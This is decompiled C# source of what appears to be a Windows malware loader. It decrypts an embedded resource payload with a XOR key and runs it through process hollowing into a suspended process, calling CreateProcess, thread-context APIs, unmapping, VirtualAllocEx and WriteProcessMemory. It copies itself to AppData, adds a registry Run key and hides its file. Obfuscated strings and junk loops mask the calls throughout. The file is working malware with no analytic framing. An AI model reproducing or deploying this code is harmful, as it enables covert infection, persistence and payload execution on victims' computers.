using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns1;

[StandardModule]
internal sealed class Class5
{
	public delegate bool Delegate0(string string_0, string string_1, IntPtr intptr_0, IntPtr intptr_1, bool bool_0, int int_0, IntPtr intptr_2, string string_2, byte[] byte_0, IntPtr[] intptr_3);

	public delegate bool Delegate1(IntPtr intptr_0, uint[] uint_0);

	public delegate bool Delegate2(IntPtr intptr_0, IntPtr intptr_1, ref IntPtr intptr_2, IntPtr intptr_3, ref IntPtr intptr_4);

	public delegate uint Delegate3(IntPtr intptr_0, IntPtr intptr_1);

	public delegate IntPtr Delegate4(IntPtr intptr_0, IntPtr intptr_1, IntPtr intptr_2, int int_0, int int_1);

	public delegate bool Delegate5(IntPtr intptr_0, IntPtr intptr_1, byte[] byte_0, IntPtr intptr_2, ref IntPtr intptr_3);

	public delegate int Delegate6(IntPtr intptr_0);

	private static ushort ushort_0 = 700;

	public static byte[] smethod_0(byte[] byte_0)
	{
		byte[] array = new byte[10] { 77, 193, 37, 248, 106, 244, 34, 57, 85, 36 };
		int num = array.Length;
		long num2 = 10L;
		checked
		{
			do
			{
				num2++;
			}
			while (num2 <= 95L);
			int num3 = byte_0.Length - 1;
			for (int i = 0; i <= num3; i++)
			{
				byte_0[i] = unchecked((byte)(byte_0[i] ^ array[i % num]));
			}
			return byte_0;
		}
	}

	public static string smethod_1(uint uint_0, string string_0, string string_1)
	{
		bool flag = false;
		float num = 8f;
		do
		{
			num += 1f;
		}
		while (num <= 104f);
		checked
		{
			if (flag)
			{
				byte b = 6;
				do
				{
					b = (byte)unchecked((uint)(b + 1));
				}
				while (unchecked((uint)b) <= 89u);
			}
			short num2 = 16;
			do
			{
				_ = DateTime.Now;
				num2 = (short)unchecked(num2 + 1);
			}
			while (num2 <= 47);
			return Encoding.UTF8.GetString(smethod_0(Convert.FromBase64String(string_0)));
		}
	}

	public static void smethod_2()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		object objectValue = default(object);
		string text = default(string);
		string text2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 392:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							default:
								goto end_IL_0001;
							case 1:
								break;
							case 0:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0020;
						case 4:
							goto IL_0043;
						case 6:
						case 7:
							goto IL_005f;
						case 8:
							goto IL_0069;
						case 9:
						case 10:
							goto IL_0072;
						case 11:
							goto IL_008a;
						case 13:
							goto IL_00a0;
						case 14:
							goto IL_00a3;
						case 15:
							goto IL_00b2;
						case 12:
						case 16:
						case 17:
							goto IL_00c6;
						case 18:
							goto IL_00ee;
						case 19:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 0:
							goto end_IL_0001;
						case 5:
						case 20:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_00ee:
					num = 18;
					NewLateBinding.LateCall(objectValue, (Type)null, "regwrite", new object[2]
					{
						smethod_1(1896920007u, "BYpmrTanbX8BcwyTYKQnnUFLOlcip1GkPZ1MXTpTPp1mjRiGR1chciizVpEFmn5rIEo=", "%1i_wIz}{") + text,
						text2 + text
					}, (string[])null, (Type[])null, (bool[])null, true);
					break;
					IL_00c6:
					num = 17;
					objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(smethod_1(67623698u, "OrJGigOEVhcmTCitSQ==", "Q?iX3<D"), ""));
					goto IL_00ee;
					IL_0009:
					num = 2;
					text = smethod_1(485745041u, "EfAd1g+MRw==", "Kob#");
					goto IL_0020;
					IL_0020:
					num = 3;
					text2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + smethod_1(779622971u, "AKhGigWHTV8heB64VowPmX5qMFY7qEadGQ==", "W<SE4Id.H-s8");
					goto IL_0043;
					IL_0043:
					num = 4;
					if (Operators.CompareString(Application.get_ExecutablePath(), text2 + text, false) == 0)
					{
						goto end_IL_0001_3;
					}
					goto IL_005f;
					IL_005f:
					num = 7;
					if (!Directory.Exists(text2))
					{
						goto IL_0069;
					}
					goto IL_0072;
					IL_0069:
					num = 8;
					Directory.CreateDirectory(text2);
					goto IL_0072;
					IL_0072:
					num = 10;
					if (Operators.CompareString(Application.get_ExecutablePath(), text2 + text, false) != 0)
					{
						goto IL_008a;
					}
					goto IL_00a0;
					IL_008a:
					num = 11;
					File.Copy(Application.get_ExecutablePath(), text2 + text);
					goto IL_00c6;
					IL_00a0:
					num = 13;
					goto IL_00a3;
					IL_00a3:
					num = 14;
					File.Delete(text2 + text);
					goto IL_00b2;
					IL_00b2:
					num = 15;
					File.Copy(Application.get_ExecutablePath(), text2 + text);
					goto IL_00c6;
					end_IL_0001_2:
					break;
				}
				num = 19;
				NewLateBinding.LateCall(objectValue, (Type)null, "regwrite", new object[2]
				{
					smethod_1(781595919u, "BYpptTanbX8BcwyTYKQnnUFLOlcip1GkPZ1MXTpTPp1mjRiGR1chciizVpEFmn5rIEo=", "C3n&0ZXF") + text,
					text2 + text
				}, (string[])null, (Type[])null, (bool[])null, true);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 392;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static int smethod_3(long long_0, int int_0, double double_0, byte[] byte_0, sbyte sbyte_0, byte byte_1, ulong ulong_0)
	{
		short num = 3;
		checked
		{
			do
			{
				num = (short)unchecked(num + 1);
			}
			while (num <= 61);
			string text = "Q/s41";
			int i = 0;
			for (int length = text.Length; i < length; i++)
			{
				_ = text[i];
			}
			return Color.FromArgb(byte_0[int_0 + 3], byte_0[int_0 + 2], byte_0[int_0 + 1], byte_0[int_0]).ToArgb();
		}
	}

	public static byte[] smethod_4(sbyte sbyte_0, int int_0, int int_1, ulong ulong_0, int int_2)
	{
		Color color = Color.FromArgb(int_1);
		return new byte[4] { color.B, color.G, color.R, color.A };
	}

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string string_0);

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetProcAddress(IntPtr intptr_0, string string_0);

	public static T smethod_5<T>(bool bool_0, string string_0, uint uint_0, double double_0, ulong ulong_0, ushort ushort_1)
	{
		long num = 15L;
		checked
		{
			do
			{
				short num2 = 0;
				do
				{
					ushort num3 = 8;
					do
					{
						num3 = (ushort)unchecked((uint)(num3 + 1));
					}
					while (unchecked((uint)num3) <= 26u);
					short num4 = 8;
					do
					{
						num4 = (short)unchecked(num4 + 1);
					}
					while (num4 <= 90);
					num2 = (short)unchecked(num2 + 1);
				}
				while (num2 <= 44);
				num++;
			}
			while (num <= 25L);
			sbyte b = 14;
			do
			{
				string text = "U]rx''cYL]";
				int i = 0;
				for (int length = text.Length; i < length; i++)
				{
					_ = text[i];
				}
				b = (sbyte)unchecked(b + 1);
			}
			while (b <= 116);
			return Conversions.ToGenericParameter<T>((object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle(string_0.Split(new char[1] { Convert.ToChar(58) })[0]), string_0.Split(new char[1] { Convert.ToChar(58) })[1]), typeof(T)));
		}
	}

	public static void smethod_6(object object_0)
	{
		MethodInfo entryPoint = Assembly.Load((byte[])object_0).EntryPoint;
		string text = ".IMje^";
		int i = 0;
		checked
		{
			for (int length = text.Length; i < length; i++)
			{
				_ = text[i];
				ulong num = 11uL;
				do
				{
					num++;
				}
				while (num <= 36L);
				sbyte b = 19;
				do
				{
					b = (sbyte)unchecked(b + 1);
				}
				while (b <= 62);
			}
			if (entryPoint.GetParameters().Length == 0)
			{
				entryPoint.Invoke(null, null);
				return;
			}
			entryPoint.Invoke(null, new object[1] { new string[0] });
		}
	}

	public static void smethod_7(DateTime dateTime_0, short short_0, byte[] byte_0, float float_0, decimal decimal_0, float float_1)
	{
		int num = 0;
		checked
		{
			do
			{
				num++;
			}
			while (num <= 100);
			if (byte_0[60] == 128)
			{
				Thread thread = new Thread(smethod_6);
				thread.SetApartmentState(ApartmentState.STA);
				byte b = 0;
				do
				{
					for (int i = b; i <= 30 && i != 25; i++)
					{
					}
					b = (byte)unchecked((uint)(b + 1));
				}
				while (unchecked((uint)b) <= 20u);
				thread.Start(byte_0);
				return;
			}
			string string_ = Assembly.GetEntryAssembly()!.Location;
			if (Directory.Exists(Conversions.ToString(Environment.SystemDirectory[0]) + smethod_1(0u, "d511igWTUFg4BAuoSZ0Z1ApBbRJk", "CZb5/")))
			{
				string[] directories = Directory.GetDirectories(Conversions.ToString(Environment.SystemDirectory[0]) + smethod_1(551683031u, "d51ykQSQTU4meACoRooFh01fIQoDhHGkLIZDVDBTIrNO", "~n=qBQk"));
				foreach (string text in directories)
				{
					if (text.ToLower().Contains(smethod_1(0u, "O/MLyEQ=", "{g[wtt")))
					{
						string_ = text + smethod_1(0u, "EaJTjBiRURcwXCg=", "giV`");
						break;
					}
				}
			}
			byte[] array = new byte[6] { 0, 1, 2, 3, 4, 5 };
			int[] array2 = new int[8] { 1, 16, 2, 32, 4, 64, 4, 64 };
			int num2 = smethod_3(-328477979L, 60, 23906.0, byte_0, -38, 0, 741743179uL);
			int num3 = BitConverter.ToInt16(byte_0, num2 + 6);
			IntPtr intptr_ = new IntPtr(smethod_3(0L, num2 + 84, 28397.7, byte_0, 119, 0, 560669615uL));
			IntPtr[] array3 = new IntPtr[4];
			IntPtr intPtr = default(IntPtr);
			if (!smethod_5<Delegate0>(bool_0: true, smethod_1(1462325298u, "JqRXlg+YEQtvZz+kRIwPpFBWNkE+smQ=", "I'.W9!"), 835103249u, 0.0, 903360301uL, 0)(null, string_, intPtr, intPtr, bool_0: false, 4, intPtr, null, new byte[0], array3))
			{
				return;
			}
			try
			{
				uint[] array4 = new uint[179];
				array4[0] = 65538u;
				if (smethod_5<Delegate1>(bool_0: false, smethod_1(529966616u, "JqRXlg+YEQtvYyi1cZAYkUNdFksjtUCAHg==", "&?X_~*j}"), 502266788u, -10541.78, 0uL, 20538)(array3[1], array4))
				{
					Delegate2 @delegate = smethod_5<Delegate2>(bool_0: false, smethod_1(0u, "JqRXlg+YEQtvdiigQagYm0FcJlcApEiXGI0=", null), 1900926664u, 9591.6, 697395549uL, 13119);
					IntPtr intptr_2 = array3[0];
					IntPtr intptr_3 = new IntPtr(unchecked((long)array4[41]) + 8L);
					IntPtr intptr_4 = new IntPtr(4);
					IntPtr intptr_5 = default(IntPtr);
					IntPtr intptr_6 = default(IntPtr);
					if (@delegate(intptr_2, intptr_3, ref intptr_5, intptr_4, ref intptr_6) && unchecked((long)smethod_5<Delegate3>(bool_0: false, smethod_1(1108077426u, "I7VBlAbObE0ASiCgVa4DkVV2M3coolGRBZo=", "AA;7N`."), 1072398884u, -8555.22, 1720226299uL, 10763)(array3[0], intptr_5)) == 0L)
					{
						Delegate4 delegate2 = smethod_5<Delegate4>(bool_0: true, smethod_1(486059528u, "JqRXlg+YEQtvciSzUY0LmGNVOUsuhF0=", "a%E}gw"), 1473393819u, 10931.5412, 39065402uL, 0);
						IntPtr intptr_7 = array3[0];
						IntPtr intPtr2 = new IntPtr(smethod_3(414421754L, num2 + 52, -148.6959, byte_0, -109, 56, 0uL));
						IntPtr intptr_8 = intPtr2;
						IntPtr intptr_9 = new IntPtr(smethod_3(1094514335L, num2 + 80, 0.0, byte_0, -1, 0, 0uL));
						IntPtr intptr_10 = delegate2(intptr_7, intptr_8, intptr_9, 12288, 64);
						Delegate5 delegate3 = smethod_5<Delegate5>(bool_0: false, smethod_1(0u, "JqRXlg+YEQtvcz+oUZ06hk1aMFc+jECVBYZb", "L*xX"), 288567627u, 0.0, 1677458225uL, 3398);
						delegate3(array3[0], intptr_10, byte_0, intptr_, ref intptr_6);
						int[] array5 = new int[10];
						int num4 = num3 - 1;
						for (int k = 0; k <= num4; k++)
						{
							array5[0] = 13;
							array5[5] = 255 + array5[0];
							Buffer.BlockCopy(byte_0, num2 + 248 + k * 40, array5, 0, 40);
							byte[] array6 = new byte[array5[4] - 1 + 1];
							Buffer.BlockCopy(byte_0, array5[5], array6, 0, array6.Length);
							array5.Length.ToString();
							IntPtr intptr_11 = array3[0];
							intptr_9 = new IntPtr(intptr_10.ToInt32() + array5[3]);
							IntPtr intptr_12 = intptr_9;
							intPtr2 = new IntPtr(array6.Length);
							delegate3(intptr_11, intptr_12, array6, intPtr2, ref intptr_6);
						}
						IntPtr intptr_13 = array3[0];
						intptr_9 = new IntPtr(unchecked((long)array4[41]) + 8L);
						IntPtr intptr_14 = intptr_9;
						byte[] byte_ = smethod_4(124, 1976788095, intptr_10.ToInt32(), 0uL, -398997118);
						intPtr2 = new IntPtr(4);
						delegate3(intptr_13, intptr_14, byte_, intPtr2, ref intptr_6);
						array4[44] = (uint)(intptr_10.ToInt32() + smethod_3(-335979513L, num2 + 40, 19348.5, byte_0, 104, 0, 0uL));
						smethod_5<Delegate1>(bool_0: true, smethod_1(1743524630u, "JqRXlg+YEQtvdyi1cZAYkUNdFksjtUCAHg==", "RZR<-;edk*"), 0u, -8893.2326, 740796298uL, 25377)(array3[1], array4);
						smethod_5<Delegate6>(bool_0: true, smethod_1(0u, "JqRXlg+YEQtvdiiyUJUPoEpLMEUp", "'dCU}Ny"), 160498873u, -31358.9, 0uL, 25948)(array3[1]);
						return;
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			Process.GetProcessById(array3[2].ToInt32()).Kill();
		}
	}

	[STAThread]
	public static void Main()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		int num5 = default(int);
		int length = default(int);
		bool flag = default(bool);
		bool flag2 = default(bool);
		bool flag3 = default(bool);
		ResourceManager resourceManager = default(ResourceManager);
		uint num6 = default(uint);
		decimal num8 = default(decimal);
		decimal num9 = default(decimal);
		string text2 = default(string);
		int num10 = default(int);
		int length2 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					decimal num7;
					switch (try0001_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_0009;
					case 390:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								default:
									goto end_IL_0001;
								case 1:
									break;
								case 0:
									goto end_IL_0001;
								}
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0009;
							case 3:
								goto IL_0010;
							case 4:
								goto IL_0030;
							case 5:
								goto IL_0037;
							case 6:
								goto IL_003c;
							case 7:
							case 8:
								goto IL_0042;
							case 9:
								goto IL_004f;
							case 10:
								goto IL_0055;
							case 11:
								goto IL_005c;
							case 12:
								goto IL_0062;
							case 13:
							case 14:
							case 15:
								goto IL_0069;
							case 16:
								goto IL_0077;
							case 17:
								goto IL_0084;
							case 18:
								goto IL_0098;
							case 20:
								goto IL_00a3;
							case 21:
								goto IL_00c8;
							case 22:
								goto IL_00f0;
							case 23:
								goto IL_00f9;
							case 24:
								goto IL_011a;
							case 19:
								goto IL_0129;
							case 25:
								goto end_IL_0001_2;
							default:
								goto end_IL_0001;
							case 0:
								goto end_IL_0001;
							case 26:
								goto end_IL_0001_3;
							}
							goto default;
						}
						IL_00f0:
						num = 22;
						goto IL_00f3;
						IL_0030:
						num = 4;
						goto IL_0032;
						IL_0009:
						num = 2;
						smethod_2();
						goto IL_0010;
						IL_0010:
						num = 3;
						text = "B=cU-t";
						num5 = 0;
						length = text.Length;
						goto IL_0032;
						IL_0032:
						if (num5 < length)
						{
							_ = text[num5];
							num5++;
							goto IL_0030;
						}
						goto IL_0037;
						IL_0037:
						num = 5;
						flag = true;
						goto IL_003c;
						IL_003c:
						num = 6;
						if (flag)
						{
						}
						goto IL_0042;
						IL_0042:
						num = 8;
						File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Hidden);
						goto IL_004f;
						IL_004f:
						num = 9;
						flag2 = false;
						goto IL_0055;
						IL_0055:
						num = 10;
						if (flag2)
						{
							goto IL_005c;
						}
						goto IL_0069;
						IL_005c:
						num = 11;
						flag3 = true;
						goto IL_0062;
						IL_0062:
						num = 12;
						if (flag3)
						{
						}
						goto IL_0069;
						IL_0069:
						num = 15;
						File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.ReadOnly);
						goto IL_0077;
						IL_0077:
						num = 16;
						Thread.Sleep(2242);
						goto IL_0084;
						IL_0084:
						num = 17;
						resourceManager = new ResourceManager("jigwa4h5", Assembly.GetExecutingAssembly());
						goto IL_0098;
						IL_0098:
						num = 18;
						num6 = 7u;
						goto IL_0129;
						IL_0129:
						num = 19;
						goto IL_00a3;
						IL_00a3:
						num = 20;
						num7 = new decimal(16L);
						num8 = new decimal(76L);
						num9 = num7;
						goto IL_010a;
						IL_010a:
						if (ForLoopControl.ForNextCheckDec(num9, num8, 1m))
						{
							goto IL_00c8;
						}
						goto IL_011a;
						IL_011a:
						num = 24;
						num6++;
						if (num6 > 46)
						{
							break;
						}
						goto IL_0129;
						IL_00c8:
						num = 21;
						text2 = "Oj&%,~";
						num10 = 0;
						length2 = text2.Length;
						goto IL_00f3;
						IL_00f3:
						if (num10 < length2)
						{
							_ = text2[num10];
							num10++;
							goto IL_00f0;
						}
						goto IL_00f9;
						IL_00f9:
						num = 23;
						num9 = decimal.Add(num9, 1m);
						goto IL_010a;
						end_IL_0001_2:
						break;
					}
					num = 25;
					smethod_7(DateTime.Now, 1137, smethod_0((byte[])resourceManager.GetObject(smethod_1(0u, "KLsWggifW0E=", "C FR_"))), 14898.98f, new decimal(-66504624L), 27974.852f);
					break;
				}
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 390;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
